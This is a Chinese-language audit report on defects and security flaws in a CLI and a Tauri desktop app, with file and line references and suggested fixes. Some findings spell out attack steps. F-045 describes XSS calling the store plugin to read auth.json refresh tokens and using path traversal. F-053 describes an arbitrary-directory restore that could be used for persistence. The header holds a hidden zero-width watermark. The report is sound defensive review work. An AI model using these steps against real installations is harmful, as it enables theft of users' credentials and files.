<!--
  © 2026 IHUI AI (智汇AI) · 版权所有者: 李春川 (Li Chunchuan) · https://aizhs.top
  Provenance-watermarked. 未授权商用可被溯源追责 (Apache-2.0 须保留本声明与 NOTICE)。
  [IHUI-AI-PROVENANCE]:⁠​‌​​‌​​‌‍‍​‌​​‌​​​‍‍​‌​‌​‌​‌‍‍​‌​​‌​​‌‍‍​​‌​‌‌​‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌​​‌‌‌‌​‌​‍‍‌‌​‌‌​​​‌​​​‌‌‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌‌​‌​​‌‌‌​‍‍‌‌​​‌‌​​​‌​​‌​‌‍‍‌​‌‌‌​‌‌‌​‌‌‌​‌‍‍‌​‌‌​‌‌‌‍‍​‌​​‌‌​​‍‍​‌​​​​‌‌‍‍‌​‌‌​‌‌‌‍‍​‌‌​​​​‌‍‍​‌‌​‌​​‌‍‍​‌‌‌‌​‌​‍‍​‌‌​‌​​​‍‍​‌‌‌​​‌‌‍‍​​‌​‌‌‌​‍‍​‌‌‌​‌​​‍‍​‌‌​‌‌‌‌‍‍​‌‌‌​​​​‍‍‌​‌‌​‌‌‌‍‍​‌​‌​​​​‍‍​‌​‌​​‌​‍‍​‌​​‌‌‌‌‍‍​‌​‌​‌‌​‍‍​‌​​​‌​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​‌‌‍‍​‌​​​‌​‌‍‍​​‌​‌‌​‌‍‍​​‌‌​​‌​‍‍​​‌‌​​​​‍‍​​‌‌​​‌​‍‍​​‌‌​‌‌​⁠
-->

> 【过期快照警告 · 执行前必读】本报告基线 `895027a9d6` 远早于当前 `origin/main`（`e2b004b74940af915320eefa22c8c12093009e7e`）。
> 文中行号与「当场可修」结论大概率已失效，曾被误当作当前真相并误导后续 agent（已因此浪费一轮验证）。
> 凡 `PROJECT_PLAN.md` 引用本报告的任一条目，动手前**必须先对照当前代码复核**（强制纪律见 `RECONCILE-findings-staleness.md` 第四节）。
> 已确认在当前代码修复的条目，见文内 `【已修复@当前代码】` 标注。

# apps/cli 与 apps/desktop 深度缺陷普查报告

- **审计基线**：`D:\IHUI-AI` 的 `origin/main` 尖端 `895027a9d644ce0688bb0d533281cf097db69578`（本轮已执行 `git fetch origin --prune` 确认）。
- **审计方式**：`git archive` 导出该 SHA 下 `apps/cli`、`apps/desktop` 到临时快照逐文件静态审计；文中行号均为该 SHA 的基线行号。工作树内 `apps/cli` 有 24 个文件相对基线存在本地未提交改动（119+/666-），**不在本次判定范围内**；`apps/desktop/src`（桌面前端）在基线中不存在（本地未跟踪），故前端侧不纳入。
- **纪律**：全程只读。未修改 `D:\IHUI-AI` 任何文件，未执行 git 写操作，未在仓库内跑写盘命令。最小复现若执行，均在 `$env:TEMP` 下进行。
- **轮次**：本轮为第 1 轮（7 个方向并行）。第 2、3 轮见文末「轮次记录」。
- **去重源**：`PROJECT_PLAN.md`（31900 行）、`scripts/data/plan-fields.jsonl`（约 8.3 MB）。

严重度口径：P0 数据/凭据实质泄露或核心功能在目标平台全量不可用；P1 可稳定触发的功能失效或安全边界失效；P2 特定条件下失效、可观测性缺失、假绿；P3 健壮性/一致性问题。

---

## 一、P0

### F-001 run_tests 在 Windows 恒失败（Node ≥20.12 禁止无 shell 直启 `.cmd`）

- **严重度**：P0
- **文件与行号**：`apps/cli/src/tools/run-tests.ts:149`（`spawnSync(process.platform === 'win32' ? 'npm.cmd' : 'npm', …)`，未给 `shell: true`）
- **触发路径**：Windows 上任意 `run_tests` 工具调用（vitest / jest 两种框架都走同一行）。
- **根因**：Node 20.12+ / 22+ 对 `spawn`/`spawnSync` 启动 `.cmd`/`.bat` 且未开 shell 的场景直接返回 `EINVAL`（CVE-2024-27980 的修复副作用）。`package.json` 声明 `node >= 20.10.0`，没有任何版本闸挡住这条路径。且 `result.error` 从未被读取，`exitCode = result.status` 为 `null`。
- **证据**：第 149-160 行 `const result = spawnSync('npm.cmd', cmdArgs, { …, stdio:['ignore','pipe','pipe'] })`；`const exitCode = result.status;`。子代理在 `$env:TEMP` 实测：`error=EINVAL status=null`，回退分支最终输出 `npm 退出码 null`。
- **影响面**：Windows 上 CLI 的测试工具 100% 不可用，且报错信息指向"退出码 null"，完全无法自诊断。
- **建议修法**：`shell: true`（配合 `windowsHide`）或经 `ComSpec /d /s /c npm.cmd …` 调用；同时把 `result.error?.code` 单独成档，不要与"非零退出码"合并。
- **是否当场可修**：是。

### F-045 远程 capability 仍授予 `store:default`，同时新的受限通道未被授权

- **严重度**：P0
- **文件与行号**：`apps/desktop/src-tauri/capabilities/default.json:31`；对照 `capabilities/local-fs-io.json:4`（自述 2026-11-07 DBG-38 已收口）；`apps/desktop/src-tauri/src/store_path.rs:17`
- **触发路径**：线上页（`https://aizhs.top`）或该页内任意 XSS 调 `invoke('plugin:store|load', { path: 'auth.json' })`，再 `get('refresh_token')`；路径传 `..\..\x` 或绝对路径可越出 store 根。
- **根因**：2026-11-05 的 store 越权整改只改了 Rust 侧与 web 侧，capability 未同步删除 `store:default`。上游 `tauri-plugin-store` 的 `resolve` 只做 `base_dir_path.push(path)`，绝对路径会整体替换、`..` 原样保留，无 `canonicalize` 断言；`store_path.rs` 的白名单只对自家新命令生效。
- **证据**：`default.json:31` 仍为 `"store:default",`；两个独立子代理分别命中同一行（一个从 capability 面、一个从 store_path 面）。`local-fs-io.json` 的 description 明确写"仅作用于本地 webview，不授予 remote 线上页"，说明 remote 面本应已收口。
- **影响面**：远端页面可读写 `auth.json`（refresh token）、`ihui-vault.json`（`master_key`）等任意 store 文件；等于把凭据库交给线上 XSS。另一侧：能力清单里既无 `allow-store-read-entry` 也无 `allow-store-write-entry`，若 web 侧已切到新通道，则正常登录/保险库链路会被 ACL 直接拒绝（该前端不在基线内，见「未判定」U-05）。
- **建议修法**：删除 `store:default`；按实际通道补 `allow-store-read-entry` / `allow-store-write-entry`；`store_path.rs` 内对最终路径做 `canonicalize` + 前缀断言。
- **是否当场可修**：是（删一行 + 补两行，需与 web 侧通道对齐）。

---

## 二、P1

### F-002 子命令 action 未 await，失败时退出码为 0

- **严重度**：P1
- **文件与行号**：`apps/cli/src/index.ts:1408`（`program.parse()`）；`apps/cli/src/crash-handler.ts:279-289`
- **触发路径**：`ihui "任务"`、`ihui share …`、`ihui checkpoint snapshot` 等 async action 内抛错。
- **根因**：`program.parse()` 是同步 API，commander 只把 `_parseCommand` 返回的 Promise 丢弃；拒绝落到 `unhandledRejection`，而 crash-handler 的该分支只打印不设置退出码（只有 `uncaughtException` 分支写了 `process.exitCode = 1`）。
- **证据**：`index.ts:1408 program.parse();`（全文件无 `parseAsync`）；`crash-handler.ts` 两个分支的退出码处理不对称。
- **影响面**：所有子命令；CI/脚本会把失败当成功，静默放行。
- **建议修法**：改 `await program.parseAsync()`，外层 catch 统一 `process.exitCode = 1`；`unhandledRejection` 分支补退出码。
- **是否当场可修**：是。

### F-003 杀进程树缺失（只杀 shell，不留子进程）

- **严重度**：P1
- **文件与行号**：`apps/cli/src/tools/terminal.ts:189,212,476`；`apps/cli/src/tools/background-registry.ts:1630-1639`
- **触发路径**：`terminal_close`、命令超时清理、`kill_task`。
- **根因**：只对直接子进程 `kill()`；Windows 无 `taskkill /T /F`，POSIX 侧 `detached`/进程组缺失。代码里 `if (pid && platform !== 'win32') process.kill(-pid, …)` 之后仍只有 `t.process.kill('SIGKILL')`。
- **证据**：同上述行号。
- **影响面**：dev server 杀不掉继续占端口；后台任务显示 running 实际已失控；反复调用线性累积残留进程。
- **建议修法**：Windows 用 `taskkill /T /F /PID`；POSIX 派生时 `detached: true` 并对 `-pid` 发信号。
- **是否当场可修**：是。

### F-004 POSIX 沙箱超时可能永不返回

- **严重度**：P1
- **文件与行号**：`apps/cli/src/tools/sandbox/platform/unix.ts:196-215,250`
- **触发路径**：被沙箱包装的命令超时，而其孙进程仍持有 stdout 管道。
- **根因**：超时只 `child.kill('SIGKILL')` 杀直系；孙进程继承管道 ⇒ `close` 事件不触发；Promise 只在 `close`/`error` 上 `finish`，于是永久挂起。
- **证据**：`child.kill('SIGKILL')`；`finish` 仅挂 `close`/`error`。
- **影响面**：Linux/macOS 沙箱卡死，且无残留清理；上层整个 agent turn 挂住。
- **建议修法**：`detached` + `kill(-pid)`；超时后主动 `destroy()` 管道并强制 resolve。
- **是否当场可修**：是。

### F-005 会话/子代理状态文件权限位为 0644

- **严重度**：P1
- **文件与行号**：`apps/cli/src/util/atomic-write.ts:195-200`（`0o666` 硬编码）；`apps/cli/src/sessions/state-store.ts:172`；目录 `ensureStateDir(){mkdirSync(…,{recursive:true})}`
- **触发路径**：多用户 POSIX 主机上写 `~/.ihui/sessions/*.json`、`~/.ihui/subagents/*.json`。
- **根因**：原子写入口固定 `0o666`（umask 后 0644），无 `mode` 参数；状态目录用默认 0755。这些文件含完整 `messages` 与 `toolState`（含工具输出、可能含代码与密钥）。
- **证据**：`fs.openSync(tmp, …, 0o666)`；`writeFileAtomicSync` 签名无 mode。`private-file.ts` 的 0600 只护凭据，未覆盖状态。
- **影响面**：同机其他用户可读全部对话与工具输出；与 F-008/F-009 叠加构成凭据面。
- **建议修法**：`writeFileAtomicSync` 增 `mode` 参数；状态文件传 0600，状态目录建 0700。
- **是否当场可修**：是。

### F-006 审计日志的入参脱敏只走"形状档"，键名类凭据整类失明

- **严重度**：P1
- **文件与行号**：`apps/cli/src/audit.ts:94`；`apps/cli/src/redact.ts:176`
- **触发路径**：任意工具调用 → `auditLog(input = call.arguments)`。
- **根因**：只调用 `redactObject`（按值形状匹配），未用仓库已有的键名档；`redact.ts:176` 自述"整类失明"。
- **证据**：`input: redactObject(entry.input)`；子代理实测 `{"api_key":"abc"}` 原样保留。
- **影响面**：`~/.ihui/audit.jsonl` 默认开启，短凭据/自定义键名长期明文留存，可被同机读取或随诊断包外发。
- **建议修法**：改用 `redactObjectDeepKeyed`；键名命中 `api_key|token|secret|password|cookie|authorization` 一律打码。
- **是否当场可修**：是。

### F-007 脱敏规则不覆盖本仓自己的凭据形态

- **严重度**：P1
- **文件与行号**：`apps/cli/src/redact.ts:25,27,31`
- **触发路径**：工具 error/output 含 `X-Api-Secret: sk_...` 或 `Bearer abc`（<12 字符）时进入审计/回看上下文/日志。
- **根因**：只认 `sk-`（连字符），不认 `sk_`；Bearer 要求 ≥12 字符；只认 `api_key` 键名。而 `apps/cli/src/config/credentials.ts:268` 的出站头恰为 `X-Api-Secret: sk_xxx`。
- **证据**：子代理实测三型均不被替换。
- **影响面**：机器凭据 secret 持久留痕。
- **建议修法**：增 `sk_`、`X-Api-Secret`、`Authorization` 规则；Bearer 阈值下调到 ≥6；键名集补齐。
- **是否当场可修**：是。

### F-008 凭据经 argv 明文落盘（崩溃日志与 runs manifest）

- **严重度**：P1
- **文件与行号**：`apps/cli/src/crash-handler.ts:189,193`；`apps/cli/src/runs/manifest.ts:111,144`；来源 `apps/cli/src/commands/login.ts:331`、`apps/cli/src/index.ts:200`
- **触发路径**：`ihui login -p 明文密码` 或 `--api-key sk_…` 后崩溃，或每次启动写 runs manifest。
- **根因**：argv 原样写入，且这两处不走 `writePrivateFile`，无 0600。
- **证据**：`argv: ${info.runtime.argv.join(' ')}`；`argv: process.argv.slice(2)`。
- **影响面**：密码/API Key 长期留在 `~/.ihui/crash-logs`、`.ihui-agent/state/runs`。
- **建议修法**：落盘前对 `-p/--password/--api-key/--token` 的**值**打码；文件走 `writePrivateFile`。
- **是否当场可修**：是。

### F-046 冷启动 `ihui://` 深链必然丢失

- **严重度**：P1
- **文件与行号**：`apps/desktop/src-tauri/src/lib.rs:3975`（`app.deep_link().on_open_url(...)` 注册在 app-setup）；`lib.rs:2681`（`dispatch_deep_links`）；全文件无 `get_current` 调用
- **触发路径**：应用未运行时，浏览器回跳 `ihui://sso?sso_code=…` 拉起首实例。
- **根因**：`tauri-plugin-deep-link` 在自己的 plugin-setup 阶段就 `emit("deep-link://new-url")`，并只把 URL 存进 `get_current()`；App 的 `on_open_url` 注册更晚，Tauri 事件不缓存，仓库又没有调用 `get_current()` ⇒ 冷启动这一条 URL 无人接收。
- **证据**：`lib.rs:3975 app.deep_link().on_open_url({…})`；Grep `get_current` 在 `lib.rs` 0 命中；`lib.rs:3693-3708` 只有"第二实例 argv 转发"这一条补路，覆盖不了首实例冷启动。
- **影响面**：冷启动 SSO 扫码登录无反应；深链闸门与 pending 队列全空转。
- **建议修法**：setup 首行取 `app.deep_link().get_current()` 后交给 `dispatch_deep_links`，再注册 `on_open_url`。
- **是否当场可修**：是。

### F-047 `take_pending_tray_actions` 未进 capability，托盘菜单动作永不送达

- **严重度**：P1
- **文件与行号**：`apps/desktop/src-tauri/capabilities/default.json:78`（无该 allow 项）；`apps/desktop/src-tauri/src/lib.rs:2987-2989,2939`；命令已在 `build.rs` 登记
- **触发路径**：前端挂载后按设计立即 `invoke('take_pending_tray_actions')` 取积压。
- **根因**：命令在 `build.rs` 的命令清单里，但 capability 的 allow-* 清单缺项 ⇒ 远程页调用被 ACL 拒；`gate.target_ready` 永不置真，之后每个托盘动作只入队不出队。
- **证据**：`default.json` 内 Grep `allow-take-pending-tray-actions` 0 命中（本次已复核）；`lib.rs:2939` 是 `target_ready = true` 的唯一置真点。
- **影响面**：新建对话/切主题/设置/检查更新全部无反应，仅托盘"退出"可用。
- **建议修法**：`default.json` 补 `allow-take-pending-tray-actions`，并加回归钉（见 F-040）。
- **是否当场可修**：是。

### F-053 隔离区恢复接受任意目录，落点由被读目录的 manifest 决定

- **严重度**：P1
- **文件与行号**：`apps/desktop/src-tauri/src/minimax_reset.rs:1224-1235,992-1025`
- **触发路径**：`invoke('minimax_quarantine_restore', { quarantine: "C:\\任意目录" })`。
- **根因**：入口直接 `PathBuf::from(quarantine)`，无目录名前缀校验、无祖先根断言、无原生确认（同文件 delete 分支 `:1056,:1245` 两闸都有）；随后 `manifest.root` 与 entry name 直接 `join` 后 `rename`。
- **证据**：`let q = std::path::PathBuf::from(quarantine);` / `let root = std::path::PathBuf::from(&manifest.root);` / `let dst = root.join(&name);`（本次已复核入口三行）。
- **影响面**：任意目录间文件移动，可落到启动目录实现持久化；线上页 XSS 即可触发。
- **建议修法**：补目录名前缀 + 祖先必须在 `~/.minimax` / `%APPDATA%` 下 + `canonicalize` 断言 + 原生确认。
- **是否当场可修**：是。

---

## 三、P2

### F-010 错误写 stdout 且紧跟 `process.exit`（管道下丢输出）

- **严重度**：P2
- **文件与行号**：`apps/cli/src/index.ts:305-306,745-746,820-821,852-853,1197-1198,1233-1234`；`apps/cli/src/commands/checkpoint.ts:185-186,206-207`
- **触发路径**：`--resume` 会话不存在、`init` 已存在、`mcp`/`session` 缺参、checkpoint 未找到。
- **根因**：`console.info(chalk.red(…))` 走 stdout；随后 `process.exit(1)` 不等管道异步 flush。
- **证据**：`console.info(chalk.red(...)); process.exit(1)`。
- **影响面**：重定向/管道时错误串丢失或混入 stdout 污染下游；上游只能看到退出码。
- **建议修法**：`console.error` + `process.exitCode = 1`，自然退出。
- **是否当场可修**：是。

### F-011 `--json` 输出混入非 JSON 行

- **严重度**：P2
- **文件与行号**：`apps/cli/src/index.ts:283-287,298-302,1078-1093`
- **触发路径**：`ihui --json --continue "x"`；`ihui --json undo --dry-run`。
- **根因**：会话恢复提示与 undo 预演分支没有 `jsonMode` 判定。
- **证据**：`console.info(chalk.dim(t('cli.sessionResumed', …)))`。
- **影响面**：NDJSON 消费端首行解析失败，整条管道判定失败。
- **建议修法**：所有 stdout 人读输出统一过 `jsonMode` 闸。
- **是否当场可修**：是。

### F-012 无 prompt 的默认路径忽略 `--json`/非 TTY，直接进 REPL

- **严重度**：P2
- **文件与行号**：`apps/cli/src/index.ts:649-679`；`apps/cli/src/commands/repl.ts:851`
- **触发路径**：`ihui --json`；CI 下 `ihui`（stdin 保持打开）。
- **根因**：else 分支只看 `maybeRunFullScreen`，无 `stdin.isTTY` / `jsonMode` 分支；readline 无条件创建。
- **证据**：`const rl = readline.createInterface({ input: process.stdin, … })`。
- **影响面**：ANSI 污染管道，或无限等待输入，CI 挂死。
- **建议修法**：非 TTY 且未给 prompt 时打印用法并退 1（或 2）。
- **是否当场可修**：是。

### F-013 `login` 交互提示无 TTY 守卫

- **严重度**：P2
- **文件与行号**：`apps/cli/src/commands/login.ts:232,241`
- **触发路径**：`ihui login` 无 `--account/--password`，在 CI/管道中执行。
- **根因**：直接 `await inquirer.prompt(...)`，无 `stdin.isTTY` 判定（first-run 有该判定）。
- **证据**：`opts.account ?? (await inquirer.prompt(...))`。
- **影响面**：非交互环境抛错（叠加 F-002 后退出码 0）或挂死。
- **建议修法**：非 TTY 时要求显式参数，缺失则 usage + exit 2。
- **是否当场可修**：是。

### F-014 `mcp add` 参数面两处漏洞

- **严重度**：P2
- **文件与行号**：`apps/cli/src/index.ts:807-825,809`；`apps/cli/src/commands/mcp-config.ts:355`
- **触发路径**：① `ihui mcp add foo`（无 command）② `ihui mcp add x npx --args -y pkg`。
- **根因**：① 只校验 `name`，`addMcpServer` 无 `command` 判空即落盘；② commander 变参遇 `-` 开头即终止，`-y` 被当未知选项。
- **证据**：`const server = { name, command, args, transport: … }`（无判空）；commander 变参语义。
- **影响面**：① 写入无 command 的坏 stdio 配置，启动期才炸；② 无法向 MCP server 传 flag。
- **建议修法**：① stdio 传输必须校验 `command` 或 `url`；② 支持 `--args=-y` 或改 `--` 分隔并在文档写明。
- **是否当场可修**：是。

### F-015 `serve` 的 flush 与信号退出码

- **严重度**：P2
- **文件与行号**：`apps/cli/src/commands/serve.ts:155-161,251`
- **触发路径**：`ihui serve --check-credential --json`；运行中 Ctrl+C。
- **根因**：写完 stdout 立刻 `process.exit`；shutdown 固定 `exit(0)`。
- **证据**：`process.stdout.write(JSON…); process.exit(check.ok ? 0 : 1)`；`process.exit(0)`。
- **影响面**：机器读取的检查结果被截断；Ctrl+C 语义错（应 130/143），编排器无法区分正常停止与中断。
- **建议修法**：用 `process.exitCode`；SIGINT→130、SIGTERM→143。
- **是否当场可修**：是。

### F-016 `import` / `trash` 失败路径退 0

- **严重度**：P2
- **文件与行号**：`apps/cli/src/commands/import.ts:190-194,204-212,214,226-229,250-253`；`apps/cli/src/commands/trash.ts:217-224`
- **触发路径**：`ihui import commit bad /missing.json`、后端 commit 失败、回收站清单判不出。
- **根因**：catch/业务失败只 `console.error` + `return`，从不设退出码。
- **证据**：`console.error(chalk.red('无效 source…')); return;`。
- **影响面**：脚本无法感知导入失败；"未判定"被当成功。
- **建议修法**：失败分支统一 `process.exitCode = 1`。
- **是否当场可修**：是。

### F-019 Windows 沙箱兜底超时留下孤儿进程树

- **严重度**：P2
- **文件与行号**：`apps/cli/src/tools/sandbox/platform/windows.ts:126-132,167-170,225`
- **触发路径**：PowerShell 包装器卡死触发 guard。
- **根因**：杀 PowerShell 后，PS 内本应执行的 `taskkill` 永不执行；`finally` 又删除了仍在写的工作目录。
- **证据**：`child.kill('SIGKILL'); resolve(124)`。
- **影响面**：cmd 树残留、`%TEMP%` 泄漏、后续命令抢锁失败。
- **建议修法**：guard 内直接 `taskkill /T /F $pid`；清理延后到进程确认消失。
- **是否当场可修**：是。

### F-020 git 缺失/无权限被吞成"无输出"

- **严重度**：P2
- **文件与行号**：`apps/cli/src/tools/git-shared.ts:142-147,168-174`
- **触发路径**：PATH 无 git 或权限被拒时调用任一 git 工具。
- **根因**：只处理 `ETIMEDOUT`/`ENOBUFS`；`ENOENT`/`EACCES` 走成 `status=null`、`stderr` 空、`error` 未赋值，最终落到 `else if (r.exitCode !== null && …)` 之外。
- **证据**：同上行号。
- **影响面**：不可诊断的"无输出"，用户与模型都拿不到线索。
- **建议修法**：spawn error 单独成档，透出 `code`。
- **是否当场可修**：是。

### F-021 git 输出路径被 `core.quotepath` 改写

- **严重度**：P2
- **文件与行号**：`apps/cli/src/tools/git.ts:287-290`；`apps/cli/src/plugins/git-runner.ts:534-535`
- **触发路径**：中文/特殊字符文件名参与提交、插件状态查询。
- **根因**：未加 `-z`，也未设 `-c core.quotepath=false`。
- **证据**：子代理实测输出 `"\346\212\245\345\221\212-…"`，实际文件名 `报告-最终.txt`。
- **影响面**：归属回填错路径、折叠根 `endsWith('/')` 失效、按路径提交落空。
- **建议修法**：统一 `-c core.quotepath=false` 或全部改 `-z`。
- **是否当场可修**：是。

### F-022 worktree 族绕过统一的 git 封顶出口

- **严重度**：P2
- **文件与行号**：`apps/cli/src/tools/worktree-core.ts:34-39`
- **触发路径**：worktree 增删/判脏/清理。
- **根因**：直接 `spawnSync('git', args, { cwd, encoding:'utf-8' })`，没有 timeout/maxBuffer，绕过 `resolveGitBinary` 与统一封顶。
- **证据**：同上。
- **影响面**：PATH 无 git 时全族 ENOENT；git 卡锁时永久阻塞主进程。
- **建议修法**：复用 `execGitCapped`。
- **是否当场可修**：是。

### F-023 范围提交在 worktree/子模块内必失败

- **严重度**：P2
- **文件与行号**：`apps/cli/src/tools/git.ts:201-205`
- **触发路径**：agent worktree 内 `git_commit(paths)`。
- **根因**：link worktree 的 `.git` 是文件，`GIT_INDEX_FILE` 拼成 `join(cwd,'.git','index-scope-…')` 后写入 ENOTDIR。
- **证据**：同上。
- **影响面**：按范围提交不可用，只能整仓提交（放大误提交面）。
- **建议修法**：用 `git rev-parse --absolute-git-dir` 取真实 git 目录。
- **是否当场可修**：是。

### F-024 `execGitCapped` 的 stdio 与仓库自家约定相反

- **严重度**：P2
- **文件与行号**：`apps/cli/src/plugins/git-runner.ts:351,368,576`；对照 `apps/cli/src/tools/git-shared.ts:102-105`
- **触发路径**：Windows 病会话下的安装/status。
- **根因**：三管全开，而 `git-shared.ts` 明确用 `['ignore','pipe','pipe']` 规避 `spawnSync` EBUSY。
- **证据**：`stdio: resolved.stdio`（值为 `'pipe'`）。
- **影响面**：`spawnSync` 间歇 EBUSY，表现成随机失败。
- **建议修法**：同步改 `['ignore','pipe','pipe']`。
- **是否当场可修**：是。

### F-025 取消 git 在 POSIX 无效

- **严重度**：P2
- **文件与行号**：`apps/cli/src/plugins/git-runner.ts:608-637`；`apps/cli/src/util/spawn-isolated.ts:157-171`
- **触发路径**：install/update 时取消。
- **根因**：`execFile` 未 `detached` ⇒ `kill(-pid)` 得 ESRCH；随后仅在进程组"存活"时才补刀，逻辑互斥导致不发信号。
- **证据**：`process.kill(-child.pid, 'SIGKILL')`。
- **影响面**：取消后 git 继续跑并占仓库锁。
- **建议修法**：`execFile` 加 `detached: true`，或直接 `child.kill()`。
- **是否当场可修**：是。

### F-026 GBK 输出被硬解成 UTF-8

- **严重度**：P2
- **文件与行号**：`apps/cli/src/tools/terminal.ts:191-192`；`apps/cli/src/tools/background-registry.ts:669`
- **触发路径**：936 代码页子进程输出中文。
- **根因**：`chunk.toString('utf-8')`，仓库已有 `output-encoding.ts` 却未复用。
- **证据**：同上。
- **影响面**：中文变 U+FFFD，路径/错误不可读。
- **建议修法**：复用 `decodeBufferWithFallback`。
- **是否当场可修**：是。

### F-027 `.gitignore` 按 UTF-8 读后整文件覆写

- **严重度**：P2
- **文件与行号**：`apps/cli/src/tools/worktree-state.ts:32-50`
- **触发路径**：`.gitignore` 为 UTF-16/GBK 时增删 worktree。
- **根因**：`readFileSync(…,'utf-8')` 乱码使 `includes` 落空，随后 `writeFileSync(path, content + '.worktrees/\n')` 覆盖原文。
- **证据**：同上。
- **影响面**：用户既有忽略规则被毁。
- **建议修法**：编码探测并按原编码写回；或改写 `.git/info/exclude`。
- **是否当场可修**：是。

### F-028 凭据设置文件非原子写

- **严重度**：P2
- **文件与行号**：`apps/cli/src/lib/private-file.ts:16-24`
- **触发路径**：login/sso/config/token-manager 写 `settings.json` 时崩溃或断电。
- **根因**：`fs.writeFileSync(filePath, text, …)` 直接截断原文件再写，无 tmp/rename/fsync；唯一入口只做了 chmod 纠偏。
- **证据**：本次已复核该文件全文：write → chmod，无原子性。
- **影响面**：半截 JSON ⇒ 下次启动读设置失败，用户被要求重新登录；旧 token 当场毁掉。
- **建议修法**：底层改走 `writeFileAtomicSync`，成功后 `chmod 0600`。
- **是否当场可修**：是。

### F-029 checkpoint manifest 非原子 + 一次崩溃让 GC 永久停摆

- **严重度**：P2
- **文件与行号**：`apps/cli/src/checkpoints/snapshot-store-host.ts:185`；`apps/cli/src/checkpoints/hunks.ts:193`；`apps/cli/src/checkpoints/index.ts:135-145`；`apps/cli/src/checkpoints/snapshot-gc.ts:114-116`
- **触发路径**：拷贝完文件、写 manifest 前进程被杀。
- **根因**：manifest 用裸 `writeFileSync`；无 manifest 目录在 `list()` 被跳过，GC 判 `manifest-missing` 即 `undetermined`，`finish()` 清空 deletions。
- **证据**：`writeSnapshotManifest: fs.writeFileSync(…'manifest.json'…)`；`if (out.undetermined.length > 0) return { …, deletions: [] }`。
- **影响面**：一次崩溃留下孤儿目录 ⇒ 该会话此后整轮 GC 一枚不删，快照无限增长；两处都无声。
- **建议修法**：manifest 走原子写；无 manifest 的超龄目录单独计入可删档并点名。
- **是否当场可修**：是。

### F-030 prompt-queue 固定 tmp 名、失败全吞、损坏即删

- **严重度**：P2
- **文件与行号**：`apps/cli/src/prompt-queue.ts:336-345,362-382`
- **触发路径**：两实例同启/同退；或队列文件损坏。
- **根因**：tmp 名恒为 `${persistPath}.tmp`（无 pid/随机）；写/rename 失败静默；JSON 解析失败直接 `unlink` 队列文件。
- **证据**：本次已复核 336-345 与 368-382。
- **影响面**：并发时互相截断 tmp、rename ENOENT 被吞 ⇒ 排队 prompt 静默丢失；损坏件无备份直接删。
- **建议修法**：tmp 加 pid+随机；失败至少写 stderr；损坏件改名 `.corrupt-<ts>` 隔离。
- **是否当场可修**：是。

### F-031 会话 JSON 损坏被静默当成"无此会话"

- **严重度**：P2
- **文件与行号**：`apps/cli/src/sessions/state-store.ts:133-139,239-240`
- **触发路径**：`--resume <id>` 或列表时文件被截断/手改。
- **根因**：`JSON.parse` 失败 `catch { return null }`，`listSessions` 再 `if (!s) continue`；无 warn、无隔离。读错误（126-132 行）反而做了区分，口径不一致。
- **证据**：本次已复核 133-139。
- **影响面**：用户被告知"会话不存在"而非"文件损坏"，无法自愈也无证据。
- **建议修法**：返回 `corrupt` 三态，列表点名并隔离为 `.corrupt-<ts>.json`。
- **是否当场可修**：是（需改函数签名）。

### F-032 回滚写工作区非原子，且 `rmSync` 递归删目录

- **严重度**：P2
- **文件与行号**：`apps/cli/src/checkpoints/snapshot-store-host.ts:235,245`；`apps/cli/src/checkpoints/hunks.ts:143`
- **触发路径**：checkpoint restore 期间崩溃/磁盘满；路径后来被建成目录。
- **根因**：恢复用 `copyFileSync` 直接覆盖、`writeLines` 直接 `writeFileSync`；`added` 档无类型复核即 `rmSync(…, {recursive:true, force:true})`。
- **证据**：同上。
- **影响面**：中途失败把用户文件写成半截且原内容不可恢复；目录误删会把无关新文件整棵清掉。
- **建议修法**：恢复走 tmp+rename；删除前 `lstat` 必须仍是普通文件。
- **是否当场可修**：是。

### F-033 快照版本号分配 TOCTOU

- **严重度**：P2
- **文件与行号**：`apps/cli/src/checkpoints/index.ts:128-135`
- **触发路径**：同 sessionId 两个 CLI/ACP 进程同时 snapshot。
- **根因**：`listEntryNames` 取 max+1 后 `ensureHostDir`（已存在也成功），无独占创建、无锁。
- **证据**：`allocateNextSnapshotSeriesRef(listEntryNames(this.baseDir), …)` → `ensureHostDir(cpDir)`。
- **影响面**：两写者写同一 `<uuid>@vN`，文件与 manifest 互相覆盖，回滚到错内容。
- **建议修法**：`mkdirSync(cpDir, {recursive:false})` 独占创建，EEXIST 则重分配/报错。
- **是否当场可修**：是。

### F-036 `redactUrl` 遇畸形百分号编码直接抛异常

- **严重度**：P2
- **文件与行号**：`apps/cli/src/redact.ts:67`
- **触发路径**：工具输出/错误含 `http://x/?%ZZ=1` 且进入 `auditLog`。
- **根因**：`decodeURIComponent(key)` 未包 try，`redactSecrets` 无兜底；`audit.ts:99` 无 catch。
- **证据**：本次已复核该行；子代理实测抛 `URIError: URI malformed`。
- **影响面**：审计写入中断，可连带工具结果处理失败。
- **建议修法**：decode 包 try，失败按原样处理。
- **是否当场可修**：是。

### F-037 遥测默认开启并上报绝对工作区路径

- **严重度**：P2
- **文件与行号**：`apps/cli/src/config/defaults.ts:60`；`apps/cli/src/commands/agent.ts:3155-3166`
- **触发路径**：默认配置启动 agent。
- **根因**：telemetry 默认 `enabled`，`session_start` 原样带 `workspacePath`；`redactSensitive` 只按值/URL 凭据处理，不处理路径。
- **证据**：`workspacePath: opts.workspacePath`。
- **影响面**：用户名 + 项目名外送远端 analytics。
- **建议修法**：只报 basename 或哈希。
- **是否当场可修**：是。

### F-038 secret-scan 只是告警，不是闸门

- **严重度**：P2
- **文件与行号**：`apps/cli/src/hooks/index.ts:1923-1924,1956`
- **触发路径**：agent 用 `write_file` 写入真实密钥。
- **根因**：设计上只进 `additionalContext`/stderr，永不阻断；调用点当前还丢弃返回值。
- **证据**：注释"**永不**把 proceed 置 false"。
- **影响面**：密钥照常落盘，仅提示；与 F-006/F-007 叠加时提示本身也可能被脱敏不全。
- **建议修法**：按风险档阻断或二次确认（设计变更，需产品口径）。
- **是否当场可修**：否（设计变更）。

### F-040 三份能力回归钉未接入任何 runner

- **严重度**：P2
- **文件与行号**：`apps/desktop/tests/capabilities-*.test.mjs`
- **触发路径**：CI / git-guardian 全量。
- **根因**：文件存在但无任何引用（`package.json`、`scripts/**`、`.github/workflows/**` 搜 `apps/desktop/tests` 零命中）。
- **证据**：同上述检索。
